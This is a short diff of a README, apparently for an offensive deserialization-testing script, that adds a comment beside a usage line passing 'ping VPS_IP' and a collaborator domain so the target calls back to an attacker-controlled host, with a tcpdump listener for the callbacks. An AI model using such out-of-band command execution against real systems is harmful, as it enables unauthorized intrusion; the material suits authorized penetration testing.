@@ -41,6 +41,7 @@ sudo tcpdump -i any icmp -ttttt -w - -U | tee icmp.logs | tcpdump -r -
 
 #### ON UNIX
 ```
+# You can try with curl | wget and any other command for the external interaction with IP / DOMAIN:
 ./crimson_deser.sh "ping VPS_IP" "VPS_IP" "DOMAIN_COLLAB"
 ```
 
